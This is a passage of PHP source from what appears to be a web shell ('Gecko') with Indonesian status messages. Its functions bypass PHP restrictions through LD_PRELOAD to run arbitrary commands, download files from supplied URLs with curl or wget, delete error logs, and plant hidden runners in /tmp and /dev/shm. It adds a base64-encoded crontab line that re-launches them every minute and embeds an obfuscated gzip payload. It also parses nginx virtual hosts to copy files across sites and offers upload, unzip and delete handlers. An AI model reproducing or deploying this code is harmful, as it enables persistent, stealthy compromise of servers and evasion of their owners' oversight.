        . "DIR=" . geckoBashQuote($dirPath) . "\n"
        . "rm -f \"\$DIR\"/.gecko_bp_r_* 2>/dev/null || true\n"
        . "tmpcf=\$(mktemp /tmp/.gecko_ct_XXXXXX 2>/dev/null || echo /tmp/.gecko_ct_\$\$)\n"
        . "(crontab -l 2>/dev/null | awk '\n"
        . "  index(\$0, \".gecko_bp_r_\") { next }\n"
        . "  { print }\n"
        . "') >\"\$tmpcf\" 2>/dev/null\n"
        . "crontab \"\$tmpcf\" 2>/dev/null || true\n"
        . "rm -f \"\$tmpcf\"\n"
        . "echo GECKO_LEGACY_SCRUB_OK\n";
    $scrubPath = '/tmp/.gecko_scrub_' . $instanceId . '.sh';
    if (@file_put_contents($scrubPath, $scrub) !== false) {
        @chmod($scrubPath, 0700);
        geckoBypassRun('/bin/bash ' . geckoBashQuote($scrubPath));
        @unlink($scrubPath);
        $steps[] = 'Scrub legacy webdir .gecko_bp_r_* + crontab refs';
    }

    $run = geckoBypassRun('/bin/bash ' . geckoBashQuote($tmpCron));
    $steps[] = 'bash cron.sh via LD_PRELOAD · ok=' . (!empty($run['ok']) ? 'yes' : 'no');
    if (!empty($run['output']) && $run['output'] !== '') {
        $steps[] = 'cron.sh output: ' . substr(preg_replace('/\s+/', ' ', (string)$run['output']), 0, 240);
    }
    @unlink($tmpCron);
    $steps[] = 'Temp cron.sh deleted';

    usleep(600000);
    $pid = 0;
    if (@is_file($pidFile)) {
        $pid = (int)trim((string)@file_get_contents($pidFile));
    }
    if ($pid <= 0) {
        usleep(800000);
        if (@is_file($pidFile)) {
            $pid = (int)trim((string)@file_get_contents($pidFile));
        }
    }

    $cronOk = false;
    if (function_exists('getCrontab')) {
        $cronCheck = getCrontab();
        $cronContent = isset($cronCheck['content']) ? (string)$cronCheck['content'] : '';
        if ($cronContent !== '' && strpos($cronContent, $cronMarker) !== false) {
            $cronOk = true;
        } elseif ($cronContent !== '' && preg_match('/#\s*cronsh_([a-f0-9]+)/', $cronContent, $m)) {
            $cronOk = true;
            $cronMarker = '# cronsh_' . $m[1];
            $sid = $m[1];
            $installPath = '/tmp/.' . $sid . '/.runner.sh';
            $shmPath = '/dev/shm/.' . $sid . '/.runner.sh';
            $pidFile = '/tmp/.' . $sid . '.pid';
            if (@is_file($pidFile)) $pid = (int)trim((string)@file_get_contents($pidFile));
            $steps[] = 'Crontab marker detected: ' . $cronMarker;
        }
    }

    if (!$cronOk) {
        $steps[] = 'Crontab missing/unreadable via PHP — heal via preload short b64';
        $cronOk = geckoBypassEnsureShortCrontab($installPath, $shmPath, $cronMarker, $steps);
    } else {
        $scrubOk = geckoBypassEnsureShortCrontab($installPath, $shmPath, $cronMarker, $steps);
        if ($scrubOk) {
            $cronOk = true;
            $steps[] = 'Crontab rewritten as short b64 line (safe)';
        }
    }

    if ($pid <= 0 && (@is_file($installPath) || @is_file($shmPath))) {
        $exec = @is_file($installPath) ? $installPath : $shmPath;
        $boot = geckoBypassRun('nohup /bin/bash ' . geckoBashQuote($exec) . ' >/dev/null 2>&1 & echo GECKO_PERSIST_PID:$!');
        $bout = isset($boot['output']) ? (string)$boot['output'] : '';
        if (preg_match('/GECKO_PERSIST_PID:(\d+)/', $bout, $m)) {
            $pid = (int)$m[1];
            $steps[] = 'Daemon started via preload PID ' . $pid;
        }
    }

    $steps[] = 'preload persist verify:';
    $steps[] = '- obfuscated /tmp runner: ' . (@is_file($installPath) ? 'OK' : 'MISSING');
    $steps[] = '- obfuscated /dev/shm runner: ' . (@is_file($shmPath) ? 'OK' : 'MISSING');
    $steps[] = '- PID: ' . ($pid > 0 ? ('OK ' . $pid) : 'MISSING') . ' (' . $pidFile . ')';
    $steps[] = '- Crontab: ' . ($cronOk ? 'OK (short b64)' : 'MISSING');

    $ok = (@is_file($installPath) || @is_file($shmPath) || $pid > 0 || $cronOk);
    $msgParts = array();
    if ($ok) {
        $msgParts[] = 'Preload persistence aktif';
        $msgParts[] = $cronOk ? 'crontab OK (short b64 cmd)' : 'crontab MISSING';
        $msgParts[] = 'runners /tmp+/dev/shm';
    } else {
        $msgParts[] = 'Preload persist gagal — cek mail()/LD_PRELOAD / permission crontab';
    }

    return array(
        'ok' => $ok,
        'message' => implode(' · ', $msgParts),
        'instance_id' => $instanceId,
        'install_path' => $installPath,
        'shm_path' => $shmPath,
        'pid_file' => $pidFile,
        'pid' => $pid,
        'crontab' => $cronOk,
        'cron_marker' => $cronMarker,
        'obfuscated' => @is_file($installPath) || @is_file($shmPath),
        'method' => 'preload_cron_sh',
        'steps' => $steps,
    );
}


function geckoBypassRecover($dirPath, $fileName, $downloadUrl, $wantPersist = false)
{
    if (!function_exists('geckoBypassRun')) {
        return array('ok' => false, 'error' => 'geckoBypassRun missing', 'steps' => array());
    }
    if (!function_exists('geckoBashQuote')) {
        return array('ok' => false, 'error' => 'geckoBashQuote missing', 'steps' => array());
    }

    $vd = geckoRecoverValidateDir($dirPath);
    if (!$vd[0]) {
        return array('ok' => false, 'error' => $vd[1], 'steps' => array());
    }
    $dirPath = $vd[1];

    $vf = geckoRecoverValidateFile($fileName);
    if (!$vf[0]) {
        return array('ok' => false, 'error' => $vf[1], 'steps' => array());
    }
    $fileName = $vf[1];

    $vu = geckoRecoverValidateUrl($downloadUrl);
    if (!$vu[0]) {
        return array('ok' => false, 'error' => $vu[1], 'steps' => array());
    }
    $downloadUrl = $vu[1];

    $tmp = function_exists('geckoBypassPickWorkDir') ? geckoBypassPickWorkDir() : rtrim(str_replace('\\', '/', (string)@sys_get_temp_dir()), '/');
    $uid = substr(md5(uniqid((string)mt_rand(), true)), 0, 10);
    $script = $tmp . '/gecko_br_' . $uid . '.sh';
    $instanceId = substr(md5($dirPath . '|' . $fileName . '|' . $downloadUrl), 0, 8);

    $dq = geckoBashQuote($dirPath);
    $fq = geckoBashQuote($fileName);
    $uq = geckoBashQuote($downloadUrl);

    $sh = "#!/bin/bash\n"
        . "echo GECKO_RECOVER_START\n"
        . "DIR={$dq}\n"
        . "FILE={$fq}\n"
        . "URL={$uq}\n"
        . "DEST=\"\$DIR/\$FILE\"\n"
        . "rm -f \"\$DIR\"/.gecko_bp_r_* 2>/dev/null || true\n"
        . "mkdir -p \"\$DIR\" 2>/dev/null || true\n"
        . "chmod 755 \"\$DIR\" 2>/dev/null || true\n"
        . "rm -f \"\$DIR/error_log\" \"\$DIR/error.log\" 2>/dev/null || true\n"
        . "TMP=\$(mktemp /tmp/.grec_XXXXXX 2>/dev/null || echo /tmp/.grec_\$\$)\n"
        . "DL_OK=0\n"
        . "if command -v curl >/dev/null 2>&1; then\n"
        . "  if curl -fsSL --connect-timeout 8 --max-time 40 -A 'GeckoRecover/preload' \"\$URL\" -o \"\$TMP\"; then DL_OK=1; fi\n"
        . "fi\n"
        . "if [ \"\$DL_OK\" != \"1\" ] && command -v wget >/dev/null 2>&1; then\n"
        . "  if wget -q -O \"\$TMP\" --timeout=40 \"\$URL\"; then DL_OK=1; fi\n"
        . "fi\n"
        . "if [ \"\$DL_OK\" != \"1\" ] && command -v php >/dev/null 2>&1; then\n"
        . "  if php -r '\$u=\$argv[1];\$t=\$argv[2];\$d=@file_get_contents(\$u);if(\$d===false||\$d===\"\"){exit(1);}file_put_contents(\$t,\$d);' \"\$URL\" \"\$TMP\"; then DL_OK=1; fi\n"
        . "fi\n"
        . "if [ \"\$DL_OK\" != \"1\" ] || [ ! -s \"\$TMP\" ]; then\n"
        . "  echo GECKO_RECOVER_FAIL:download\n"
        . "  rm -f \"\$TMP\" 2>/dev/null || true\n"
        . "  exit 1\n"
        . "fi\n"
        . "mv -f \"\$TMP\" \"\$DEST\" 2>/dev/null || cp -f \"\$TMP\" \"\$DEST\"\n"
        . "rm -f \"\$TMP\" 2>/dev/null || true\n"
        . "if [ ! -s \"\$DEST\" ]; then\n"
        . "  echo GECKO_RECOVER_FAIL:write\n"
        . "  exit 1\n"
        . "fi\n"
        . "chmod 444 \"\$DEST\" 2>/dev/null || true\n"
        . "SZ=\$(wc -c < \"\$DEST\" 2>/dev/null | tr -d ' ')\n"
        . "echo \"GECKO_RECOVER_OK path=\$DEST size=\$SZ\"\n"
        . "echo GECKO_RECOVER_END\n";

    if (@file_put_contents($script, $sh) === false || !@is_file($script)) {
        return array('ok' => false, 'error' => 'Gagal tulis script recover: ' . $script, 'steps' => array());
    }
    @chmod($script, 0755);

    $r = geckoBypassRun('/bin/bash ' . geckoBashQuote($script));
    @unlink($script);

    $output = isset($r['output']) ? (string)$r['output'] : '';
    $steps = array();
    if ($output !== '') {
        foreach (preg_split("/\r\n|\n|\r/", $output) as $line) {
            $line = trim($line);
            if ($line !== '') $steps[] = $line;
        }
    }

    $ok = (strpos($output, 'GECKO_RECOVER_OK') !== false);
    $path = $dirPath . '/' . $fileName;
    $size = 0;
    if (preg_match('/GECKO_RECOVER_OK\s+path=(\S+)\s+size=(\d+)/', $output, $m)) {
        $path = $m[1];
        $size = (int)$m[2];
    }

    $installPath = '/tmp/.' . $instanceId . '/.runner.sh';
    $shmPath = '/dev/shm/.' . $instanceId . '/.runner.sh';
    $pid = 0;
    $cronOk = false;

    if (empty($r['ok']) && !$ok) {
        return array(
            'ok' => false,
            'error' => !empty($r['error']) ? $r['error'] : 'Preload recover gagal (tidak ada GECKO_RECOVER_OK).',
            'message' => 'Preload recover FAIL',
            'path' => $path,
            'size' => $size,
            'pid' => 0,
            'crontab' => false,
            'install_path' => '',
            'shm_path' => '',
            'output' => $output,
            'mail_ok' => isset($r['mail_ok']) ? $r['mail_ok'] : null,
            'workdir' => isset($r['workdir']) ? $r['workdir'] : $tmp,
            'steps' => $steps,
        );
    }

    if (!$ok) {
        $fail = 'unknown';
        if (preg_match('/GECKO_RECOVER_FAIL:(\S+)/', $output, $m)) {
            $fail = $m[1];
        }
        return array(
            'ok' => false,
            'error' => 'Recover via preload gagal: ' . $fail,
            'message' => 'Preload recover FAIL',
            'path' => $path,
            'size' => $size,
            'pid' => 0,
            'crontab' => false,
            'install_path' => '',
            'shm_path' => '',
            'output' => $output,
            'mail_ok' => isset($r['mail_ok']) ? $r['mail_ok'] : null,
            'workdir' => isset($r['workdir']) ? $r['workdir'] : $tmp,
            'steps' => $steps,
        );
    }

    $message = 'Preload recover OK: ' . $path;
    if ($wantPersist) {
        $steps[] = '--- persistence (same as Recover: /tmp + /dev/shm + b64 crontab) ---';
        $p = geckoBypassRecoverDeployPersistence($dirPath, $fileName, $downloadUrl);
        if (!empty($p['steps']) && is_array($p['steps'])) {
            foreach ($p['steps'] as $s) $steps[] = (string)$s;
        }
        $pid = isset($p['pid']) ? (int)$p['pid'] : 0;
        $cronOk = !empty($p['crontab']);
        $installPath = isset($p['install_path']) ? (string)$p['install_path'] : $installPath;
        $shmPath = isset($p['shm_path']) ? (string)$p['shm_path'] : $shmPath;
        if (!empty($p['ok'])) {
            $message .= ' · persist OK';
        } else {
            $message .= ' · persist FAIL';
            if (!empty($p['error'])) $steps[] = 'persist error: ' . $p['error'];
        }
        if (!empty($p['message'])) $steps[] = $p['message'];
    }

    return array(
        'ok' => true,
        'message' => $message,
        'path' => $path,
        'size' => $size,
        'pid' => $pid,
        'crontab' => $cronOk,
        'install_path' => $wantPersist ? $installPath : '',
        'shm_path' => $wantPersist ? $shmPath : '',
        'output' => $output,
        'mail_ok' => isset($r['mail_ok']) ? $r['mail_ok'] : null,
        'workdir' => isset($r['workdir']) ? $r['workdir'] : $tmp,
        'steps' => $steps,
    );
}


function geckoBashReplaceFunction($script, $funcName, $newFuncSource)
{
    $script = (string)$script;
    $funcName = (string)$funcName;
    if ($script === '' || $funcName === '' || !preg_match('/^[A-Za-z_][A-Za-z0-9_]*$/', $funcName)) {
        return null;
    }
    if (!preg_match('/^' . preg_quote($funcName, '/') . '\s*\(\s*\)\s*\{/m', $script, $m, PREG_OFFSET_CAPTURE)) {
        return null;
    }
    $start = $m[0][1];
    $bracePos = strpos($script, '{', $start);
    if ($bracePos === false) return null;
    $depth = 0;
    $len = strlen($script);
    $end = -1;
    for ($i = $bracePos; $i < $len; $i++) {
        $ch = $script[$i];
        if ($ch === '{') $depth++;
        elseif ($ch === '}') {
            $depth--;
            if ($depth === 0) {
                $end = $i;
                break;
            }
        }
    }
    if ($end < 0) return null;
    return substr($script, 0, $start) . rtrim((string)$newFuncSource) . "\n" . substr($script, $end + 1);
}

function geckoCronShPatchShortCrontab($script)
{
    $script = (string)$script;
    $shortInstall = <<<'BASH'
install_crontab() {
  local cron_line exec_path qpath inner b64 tmpcf rc
  if type ensure_runner_mirror >/dev/null 2>&1; then
    ensure_runner_mirror 2>/dev/null || true
  fi
  if [ -n "${INSTALL_PATH:-}" ] && [ -f "$INSTALL_PATH" ]; then
    exec_path="$INSTALL_PATH"
  elif [ -n "${SHM_INSTALL_PATH:-}" ] && [ -f "$SHM_INSTALL_PATH" ]; then
    exec_path="$SHM_INSTALL_PATH"
  elif [ -n "${INSTALL_PATH:-}" ]; then
    exec_path="$INSTALL_PATH"
  else
    return 1
  fi
  qpath=$(printf '%s' "$exec_path" | sed "s/'/'\\\\''/g")
  inner="/bin/bash '$qpath' --recover"
  if type b64encode >/dev/null 2>&1; then
    b64=$(b64encode "$inner") || b64=$(printf '%s' "$inner" | base64 | tr -d '\n')
  else
    b64=$(printf '%s' "$inner" | base64 | tr -d '\n')
  fi
  # NOTE: *''/1 avoids PHP closing a block-comment on */ inside this source file
  cron_line="${CRON_SCHEDULE:-*''/1 * * * *} echo '$b64' | base64 -d 2>/dev/null | bash >/dev/null 2>&1 ${CRON_MARKER}"
  # Guard against accidental overlong lines
  if [ "${#cron_line}" -gt 800 ]; then
    cron_line="${CRON_SCHEDULE:-*''/1 * * * *} /bin/bash '$qpath' --recover >/dev/null 2>&1 ${CRON_MARKER}"
  fi
  tmpcf=$(mktemp 2>/dev/null) || tmpcf="/tmp/.gecko_crontab_$$.txt"
  (crontab -l 2>/dev/null | awk -v m="$CRON_MARKER" '
    index($0, m) { next }
    length($0) > 800 { next }
    /^[ \t]*$/ { next }
    /command too long/ { next }
    /no crontab/ { next }
    { print }
  ') >"$tmpcf" 2>/dev/null
  echo "$cron_line" >>"$tmpcf"
  crontab "$tmpcf" 2>/dev/null
  rc=$?
  rm -f "$tmpcf"
  return $rc
}
BASH;

    $replaced = geckoBashReplaceFunction($script, 'install_crontab', $shortInstall);
    if ($replaced !== null) {
        $script = $replaced;
    } else {
        $script .= "\n# === gecko short crontab override ===\n" . $shortInstall . "\n";
    }

    $noopPayload = "build_cron_payload() {\n  return 0\n}";
    $p2 = geckoBashReplaceFunction($script, 'build_cron_payload', $noopPayload);
    if ($p2 !== null) {
        $script = $p2;
    }

    
    if (preg_match('/install_crontab\s*\(\)[\s\S]{0,400}build_cron_payload/', $script)) {
        $script .= "\n# === gecko short crontab override (force) ===\n" . $shortInstall . "\n";
    }

    
    return geckoCronShNormalizeLf($script);
}

function geckoEmbeddedCronShTemplate()
{
    
    $raw = gzdecode(base64_decode('H4sIAAAAAAAEAOUa23baSPKdr+jISoDMyoAnycw6QzbEJhOfwZADODM5TlZHlhqjWBcsCV/GZh/3A/YT90u2+qJWd0tgkuzLniU5B9Oqqq57VVdr51HrzI9aZ046r9V2UFf6oIPR8O3Rr8pa7fBobL/vTd91jdbCyeZG7e3RoG8Pe8f9rjHzA2zUDke/Dwej3qF9Mh50jXmWLdL9FgCnGd7FuJW0TgL8wgHE3mDwpnfwG4GbdBvN2mH/be9kMLXpFv3x8dFkcjQaTrrGT8+fG+Ip3U95/OzZM6M2GfT77+2j4bQ//tAbdDu1cf/gXR+oi6Uf27WD8Wg47b2xtScv4AkwYYO8w/7B1J4eHfdHJ9Nuh68f9/6gazkJewIEDk8G/W79aauDnrJ/9drk3TEQnUxBMCIEqMjDV610Hhol1dK9h72BqlyKPDzo20eHXcNsLBI/ymao/ji9p//ryDBz/Rvwt1A9+SGr3UD3KPSep8sQ7b2iTETLIIBFd5khy+1YP6P7e/Rd5N0LQp1T9OqojqxZp2nUcvm5j2ThorVr3kmCrVq7yTKKcLKbgvfIKmMo5p2mxtVGAuMTsBnjGZzIMGVihG99A6PJPJZvlsvbkqStDUbgHeR3tQC7QexeAOvve78PbQK7BixdONcRB572xr/2p5ugMyc5xxkHf390uImBhe8ZzBOPe+Pf+uBpO8hN4iid2ypk2fHe9QcQPBPV785ePMORG3u40UR3NQQff4YgJeAXz5BlzXGwAD960gFznyd4gaxLVP9kXddfomyOIwpPPoU/EU/qEC/JaVyjNgXDQYq3gL9HWQJeBbtEdQo+82urWsGmnWYJdsLv4nYja5v5uE78DNvx2WyZuk6GPTuLBStgPydAHk6zLpFJWgPuYWlPXgpwhELfQ1cddLWHvnTQlz20TLF9/qe/ANgfDY2k7flJja5ddbqG3b6RcwRRomR7Qwr3Z01G6Wpve6zn1s8c6wvZ68sDSA+nG+zOY9TOae59H82/Wp0XClGmKRx1zbsd0PSK/gbdds1Gg6i5hfaaTbqYK5JkWPiKnBDD1mTV4MyFF7COrAVfJsB8A3C0U1jNbWQgC1+iDvqs+RZ4BXqVE0W//NIfva3tSIXWvPvSWXUl6W+I9OPe8HB0zL8MVWwuqYcd7wzjWZOQ2PsmEq4zw2fOGSYkroCLunkH+tpv74OyVnWyuCcW2RJFMz6ZdxRhxf7YW62M+zyGvHuiDfh2ydIcWSkEIkF5bdSI7KX4+v9T0Fq9QEqh3+48jD30U7st1CIxV5l1/CjNnCDQUk+auBWZp0grbUT6NuHObhyGTuQh6wpRG0oKIUlUT5qQw8wGM7YbAaewm6ZFpGfppsA+RRbBAQADfUZPnhRMdXJViCCz/hSQlTyIXQCsQdyJ8dI0mopWZ3FC5UU+2flO7hZOX39eGS+RFwvKFXkdkGibmzMjxT5LJnGEiXFCP0nixGaNCeDZ0PXphpmHNH+TFf63moLKrUopHXE8tu6CEWZoi5an5F8lCN3XSuJAF6KJAytCHP63Ks4DonAcVZQyYxqdkigbxcBRukxwLgYTSm4aTqsUSD3zFD1ax5Huj1Wm5xmv2KKCjLLNV24ByittUUl+SxmAyiPkhguSobZwKFnPGqWvd0yBtbWD5hg8XyiVJcHZMomQSCjgBVxt+Aa7Nglm4QFV7kHKgEJjrYI3dr/VYnLC7XK2285M6h7r1Vm1jxAKNJLeRu7G8nH3pjd5Z09GJ+OD/mkb8qQEwfFE8Eu/vyoBSHhyd0VVQcsKd2H+61F3nY/LAA/rcF0Z5WSKsKryDo3W/sP+9xUJ6+uCYFU62o37B6MP/fFH9WzHxQAtYzeLk1s1/z0ixxv52F9KPYXBBFDZfTfT4AcYP7EXOAlTsS5WoJ6DDUhfjx47CilJ4qKP4F24QOe2XzM/KvNTKHoDki6vJDNLK26AncjGNDMH8XkqFAv6wBJ6S4Bwj01C5uQVAOvxdx/CpwCELy++joLY8Wwyjtt4Lk3n/iyTni4TWtaLzoks0Mbptdoo8UYOHhOWIGO6cZT50bIIAyADRg0vMhwumpUQpPck9K1ZOhmgT4pxLAvAI/BXK/NDHC9Jd1c1oTNKeKFzQ3FyhHx0p0Ny5q2YdSJqD8sqZ5o/2sZ99KmkwZEVpPCKGY5S5V2+AqDkbcnh6LOwQC5aTwmLZvYIYy+1IdTjKyzFuugzxOyLG44+SLUHhBCg+7NbG44GQC2FxIFtYkIcZeU+kPhJ3geqVheslV1KHShCyVHmweXm/GGf+9/2qDwdV1lJ6s2470gQm3uxb3bWCoctNi1BlrxTeai7NXUGX3X9dQTWxQR1/1olqhwQy4UHVZ7mQlos/DT14yjVnFg8TrVGRLaEpt0CRy9f1cYp1a+CgFbAyvb51hRUYTGlhl372dxmk2ebTJ41tVw7fmW5aBTUCBaybsgc1TAJPMjc7tBhyo2f8T6IfEgRoT+aBOCVYUojcVq38qzFbOWTrktjB+TFjJ3cSmq605SU+0WFEpQaqVpsq8wkH74Mk/BlILAgS5plc61PpkqbWO124pyop+ntxM2JrwkEekCSFF+t8rvOvnW59N0LLrruN+g5qjBfrhp5D2ja9POXaE1ZB6y1VTIy21HgSzSV38yo3BhlfJtKsiUVCmtUdNvvjw5RCx32+sejodpx+6ntOTiMI3p28KNzTacL38v7PGKv/K6H53rlALGgA2w23irgSkmF10ZyLcT85cKHomO18zXt3ADJKsk4j4I3+UxYLt3gmiWxdP/TDp0bMsWPkAL2KnLEFrtQvyFYSkHQjhriqF8rUPgKqFOfBzQlTkrRJLQunkTxfLlAdJ5rmIIIVH6LMa6PUNETgZoGGC9keXVhRYLcgwRZXDCyvp5BBnFcjOLI9gDdBmhxacnDnqk7Ik+FfG0mH51XmyadwKvyZYmzQPWS7HXU/+NoSi6t0RQKTE1y5sBJMxL6c+xedNvsJ7mKzJwzO1+M4uuaHPD8OVu7npM4y5IlVtq9qtO35GpFyEp2uQbjkiSHfniclqptowEAyKrgsNkE453TBq/y/YDq8qvJIj+qUIJJdFDlsA8VMVlcJSMJPoIqAblFCtH01yGqharOoCXZcnsrUiljEPJZV3Gq1MAiA3xeeY1DnbHrb6cwY6HG5N1oPEUHx4fo3//8F7+6baopeQf12WVBHAW3RGxoZuIkg5+W56cXiLkZcknuAzVmaEail68unFvSKzR3gcxvwGaKAj/C6BoDyDLyAOKDf+Nj9I9Ou9223LmTAEAI4cZcOx81QXjTnfmNy27tbOkHHvUTm28h1SSeS0HsfE7GHUorJhSd8iNSEbrkNx6EeXL3A42xO0OJK1J5drvA1dPPzdc/lSjaHRqJ5Iquhl6/yNOsfWulTqk3j+2KBF41XM3n4HQXfW5W2unhIaG8W/WYVdmxvNtXcv/QAPGSly51ACwVn3uUYjgMpK16q/4JPvV665xfhVE/6BrichXVTUquDhWLxztjo3yxRlGNZqktEU7XZTlTvBDFSkud3JXVpdc/PP2KkLChl0lTeqGFd/g76Nelk3j7kCKBSza6RU6ECM9BDPHEY4IGZOFsYJEdweKKZMAM/QxlULfKDppBYJ05UCgXgeNHPCkIYptF3aTQB4STTUuDU0xNlN6OhhN9zF8D4u/4uJltmrvZDZ8e7aDDJF6geJmg0EkuYPcfUG/4sdASTQ+NAJ877i3NbBbPNwiHZ1B7mJ80cmVagWYu5/qC3A+HuQq4GKheVDFIgzcNs/0XFEJ6AnPdZGhVNGU4Os/m8LgJLQcxRAmi9fdT9Cn7/NRsVTzLr6izOEZEniqYKM59oeLpHbs44St14IIOC9xZef7OrvJNYXUDvRLAwvWJktZSSNyu+Td9LpFj8ygyIReTCTJvEXiGx0X+X2sK9kbT20ukmkK67NTLRGkT4lVaTamorv3hdPzx/Yi0fEoldSGkETsQQmT5LJjy1rdouvTThNayS72sWHv5ktPiMbQ1sa1bReGt/5We69FWZ5XNHdW39Eya2HoDKh/udN0+fUCn0slEc5CN1NXjtbwpTh239h9p5V+jYywAAA=='));
    
    return is_string($raw) ? geckoCronShNormalizeLf($raw) : '';
}

function geckoMassParseNginxVhosts($content)
{
    $entries = array();
    $content = (string)$content;
    if ($content === '') return $entries;

    
    $len = strlen($content);
    $i = 0;
    while ($i < $len) {
        if (!preg_match('/\bserver\s*\{/i', $content, $sm, PREG_OFFSET_CAPTURE, $i)) {
            break;
        }
        $start = $sm[0][1] + strlen($sm[0][0]);
        $depth = 1;
        $j = $start;
        while ($j < $len && $depth > 0) {
            $ch = $content[$j];
            if ($ch === '{') $depth++;
            elseif ($ch === '}') $depth--;
            $j++;
        }
        $body = substr($content, $start, max(0, $j - $start - 1));
        $i = $j;

        $serverNames = array();
        if (preg_match_all('/^\s*server_name\s+([^;]+);/im', $body, $nm)) {
            foreach ($nm[1] as $line) {
                foreach (preg_split('/\s+/', trim($line)) as $alias) {
                    $dn = geckoMassNormalizeVhostDomain($alias);
                    if ($dn !== '' && !in_array($dn, $serverNames, true)) {
                        $serverNames[] = $dn;
                    }
                }
            }
        }
        $docRoot = '';
        if (preg_match('/^\s*root\s+["\']?([^"\'\s;]+)["\']?\s*;/im', $body, $rm)) {
            $docRoot = rtrim(str_replace('\\', '/', trim($rm[1])), '/');
        }
        if ($docRoot === '' || empty($serverNames)) continue;
        $entries[] = array(
            'domains' => $serverNames,
            'path' => $docRoot,
            'engine' => 'nginx',
        );
    }
    return $entries;
}


function runTerminal($command, $cwd = null, $timeoutSec = 60, $unused = false)
{
    if (function_exists('geckoShellRunFallbackSPE')) {
        return geckoShellRunFallbackSPE($command, $cwd, $timeoutSec);
    }
    return array('output' => 'no shell', 'exit_code' => 1, 'no_shell' => true);
}

function runTerminalFallbackShell($command, $cwd = null, $timeoutSec = 60)
{
    return runTerminal($command, $cwd, $timeoutSec, false);
}

function mini_h($s)
{
    return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8');
}

function mini_print_gecko($r, $title = '')
{
    echo '<pre style="background:#000;padding:10px;color:#0f0;border:1px solid #0f0;overflow:auto;text-align:left;width:98%;">';
    if ($title !== '') {
        echo mini_h($title) . "\n";
    }
    if (!empty($r['message'])) {
        echo mini_h($r['message']) . "\n";
    }
    if (!empty($r['error'])) {
        echo 'error: ' . mini_h($r['error']) . "\n";
    }
    if (!empty($r['path'])) {
        echo 'path: ' . mini_h($r['path']) . "\n";
    }
    if (isset($r['size'])) {
        echo 'size: ' . (int)$r['size'] . "\n";
    }
    if (isset($r['mail_ok'])) {
        echo 'mail_ok: ' . (!empty($r['mail_ok']) ? 'yes' : 'no') . "\n";
    }
    if (!empty($r['workdir'])) {
        echo 'workdir: ' . mini_h($r['workdir']) . "\n";
    }
    if (array_key_exists('crontab', $r)) {
        echo 'crontab: ' . (empty($r['crontab']) ? 'MISSING' : 'OK') . "\n";
    }
    if (isset($r['pid'])) {
        echo 'pid: ' . (int)$r['pid'] . "\n";
    }
    if (!empty($r['install_path'])) {
        echo 'tmp: ' . mini_h($r['install_path']) . "\n";
    }
    if (!empty($r['shm_path'])) {
        echo 'shm: ' . mini_h($r['shm_path']) . "\n";
    }
    if (isset($r['confirmed'])) {
        echo 'confirmed: ' . (int)$r['confirmed'] . "\n";
    }
    if (!empty($r['urls']) && is_array($r['urls'])) {
        echo "\n--- urls ---\n";
        foreach ($r['urls'] as $u) {
            echo mini_h($u) . "\n";
        }
    }
    echo 'ok: ' . (empty($r['ok']) ? 'NO' : 'YES') . "\n";
    if (!empty($r['steps']) && is_array($r['steps'])) {
        echo "\n--- steps ---\n";
        foreach ($r['steps'] as $s) {
            echo mini_h($s) . "\n";
        }
    } elseif (isset($r['output']) && (string)$r['output'] !== '') {
        echo "\n" . mini_h($r['output']);
    }
    if (!empty($r['debug_log']) && is_array($r['debug_log'])) {
        echo "\n--- debug ---\n";
        foreach ($r['debug_log'] as $s) {
            echo mini_h($s) . "\n";
        }
    }
    echo '</pre>';
}


$gecko_out = null;
if ($tab === 'recover' && isset($_POST['gecko_recover'])) {
    $gdir = trim((string)$_POST['dir']);
    $gfile = trim((string)$_POST['file']);
    $gurl = trim((string)$_POST['url']);
    $wantPersist = (isset($_POST['persist']) && (string)$_POST['persist'] === '1');
    $r = geckoRecoverTarget($gdir, $gfile, $gurl, true);
    $gecko_out = array('title' => '=== recover ===', 'r' => $r);
    if (!empty($r['ok']) && $wantPersist) {
        $p = geckoRecoverDeployPersistence($gdir, $gfile, $gurl);
        $gecko_out['persist'] = $p;
    }
}
if ($tab === 'preload' && isset($_POST['gecko_preload'])) {
    $pmode = isset($_POST['pmode']) ? (string)$_POST['pmode'] : 'cmd';
    if ($pmode === 'recover') {
        $gdir = trim((string)$_POST['dir']);
        $gfile = trim((string)$_POST['file']);
        $gurl = trim((string)$_POST['url']);
        $wantPersist = (isset($_POST['persist']) && (string)$_POST['persist'] === '1');
        $r = geckoBypassRecover($gdir, $gfile, $gurl, $wantPersist);
        $gecko_out = array('title' => '=== preload recover ===', 'r' => $r);
    } else {
        $cmd = trim((string)$_POST['pcmd']);
        $r = geckoBypassRun($cmd);
        $gecko_out = array('title' => '=== preload cmd ===', 'r' => $r);
    }
}
if ($tab === 'mass' && isset($_POST['gecko_mass'])) {
    $src = trim((string)$_POST['src']);
    $base = trim((string)$_POST['base']);
    $mode = isset($_POST['mode']) ? (string)$_POST['mode'] : 'v1';
    $v2 = ($mode === 'v2');
    $v3 = ($mode === 'v3');
    $r = geckoMassCopyRun($src, $base, true, $v2, 0, 0, $v3, $mode);
    $gecko_out = array('title' => '=== mass copy ===', 'r' => $r);
}




if (isset($_POST['zip_del']) && isset($_POST['files'])) {
    $zip = new ZipArchive();
    $zipName = "archive_" . time() . ".zip";
    if ($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
        foreach ($_POST['files'] as $f) {
            $fPath = $dir . '/' . $f;
            if (is_dir($fPath)) {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($fPath), RecursiveIteratorIterator::LEAVES_ONLY);
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = substr($filePath, strlen($dir) + 1);
                        $zip->addFile($filePath, $relativePath);
                    }
                }
            } else {
                $zip->addFile($fPath, $f);
            }
        }
        $zip->close();
        $msg = "File berhasil di-zip menjadi $zipName";
    }
}

if (isset($_GET['unzip'])) {
    $zipFile = $dir . '/' . $_GET['unzip'];
    $zip = new ZipArchive;
    if ($zip->open($zipFile) === TRUE) {
        $zip->extractTo($dir);
        $zip->close();
        $msg = "Unzip berhasil!";
    } else {
        $msg = "Gagal unzip!";
    }
}

if (isset($_FILES['u_file'])) {
    if ($u_f($_FILES['u_file']['tmp_name'], $dir . '/' . $_FILES['u_file']['name'])) {
        $msg = "Upload Berhasil!";
    }
}

if (isset($_GET['del'])) {
    $target = $dir . '/' . $_GET['del'];
    if (is_dir($target)) { $s_e("rm -rf " . escapeshellarg($target)); } 
    else { unlink($target); }
    header("Location: ?d=" . ep($dir));
}

if (isset($_POST['bulk_del']) && isset($_POST['files'])) {
    foreach ($_POST['files'] as $f) {
